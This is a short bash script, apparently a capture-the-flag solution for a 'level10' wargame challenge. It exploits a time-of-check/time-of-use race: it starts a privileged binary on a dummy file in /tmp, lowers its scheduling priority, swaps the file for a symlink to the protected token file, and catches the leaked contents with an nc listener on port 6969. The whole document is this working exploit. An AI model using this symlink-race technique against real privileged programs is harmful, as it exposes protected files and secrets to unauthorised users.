#!/bin/bash

for wait_amount in $(seq 100)
do
        rm /tmp/bonjour
        echo not the flag > /tmp/bonjour
        /home/user/level10/level10 /tmp/bonjour 127.0.0.1 &
        PID=$!
        chrt -p -i 0 $PID
        seq 1 > /dev/null
        rm /tmp/bonjour
        ln -s /home/user/level10/token /tmp/bonjour
        nc -l 6969
        wait $PID
done
